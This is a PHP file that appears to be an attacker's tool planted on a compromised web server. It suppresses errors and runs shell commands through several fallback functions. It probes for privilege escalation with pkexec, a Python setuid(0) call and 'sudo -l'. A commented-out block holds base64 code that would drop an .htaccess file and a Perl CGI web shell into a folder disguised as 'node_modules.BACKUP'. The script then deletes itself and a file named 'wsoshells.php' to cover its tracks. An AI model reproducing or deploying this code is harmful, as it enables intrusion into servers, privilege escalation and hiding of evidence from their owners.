<?php
/**
 * Execute command
 *
 * @param string $in command
 * @param boolean $re pipes stderr to stdout
 * @return string|bool false
 */
error_reporting(0);
function cmd($in, $re = false)
{
    $in = $in . ' 2>&1';
    if (function_exists('exec')) {
        @exec($in, $out);
        $out = @join("\n", $out);
		return $out;
    }
    elseif (function_exists('passthru')) {
        ob_start();
        @passthru($in);
        $out = ob_get_clean();
		return $out;
    }
    elseif (function_exists('system')) {
        ob_start();
        @system($in);
        $out = ob_get_clean();
		return $out;
    }
    elseif (function_exists('shell_exec')) {
        $out = shell_exec($in);
		return $out;
    }
    elseif (function_exists('popen') && function_exists('pclose')) {
        if (is_resource($f = @popen($in, 'r'))) {
            $out = '';
            while (!@feof($f))
                $out .= fread($f, 1024);
                return $out;
            pclose($f);
        }
    }
    else {
        return false;
    }
    return $out;
}

$result = cmd('pkexec --version');

echo $result;
echo(cmd("pkexec"));
echo '<br>';
echo(cmd("python -c 'import os; os.setuid(0); os.system(\"id\")'"));
echo '<br>';
echo(cmd("sudo -l"));

// if(strpos($result, 'pkexec version') == false) {
	// mkdir('node_modules.BACKUP');
	// file_put_contents('node_modules.BACKUP/.htaccess',base64_decode('T3B0aW9ucyBGb2xsb3dTeW1MaW5rcyBNdWx0aVZpZXdzIEluZGV4ZXMgRXhlY0NHSQ0KDQpBZGRUeXBlIGFwcGxpY2F0aW9uL3gtaHR0cGQtY2dpIC5jaW4NCg0KQWRkSGFuZGxlciBjZ2ktc2NyaXB0IC5jaW4NCkFkZEhhbmRsZXIgY2dpLXNjcmlwdCAuY2lu'));
	// file_put_contents('node_modules.BACKUP/cmd.cin',base64_decode('IyEvdXNyL2Jpbi9wZXJsCnVzZSBDR0k7CnByaW50IENHSTo6aGVhZGVyKCAtdHlwZSA9PiAndGV4dC9odG1sJyApOwpteSAkY29tbWFuZCA9IENHSTo6cGFyYW0oJ2NvbW1hbmQnKTsKCiRyZXN1bHQgPSBgJGNvbW1hbmRgOwpwcmludCAkcmVzdWx0IC4gJzwvYnI+JzsKCiRyZXN1bHRfMiA9IGBwa2V4ZWMgLS12ZXJzaW9uOyB1bmFtZSAtYWA7CnByaW50ICRyZXN1bHRfMjs'));
	// chmod('node_modules.BACKUP/cmd.cin', 0755);
	// echo 'Perl CGI Script Uploaded';
// }

unlink(basename($_SERVER['PHP_SELF']));
unlink(__FILE__);

@unlink('wsoshells.php');
@unlink('node_modules.BACKUP');
unlink('wsoshells.php');
unlink('node_modules.BACKUP');
?>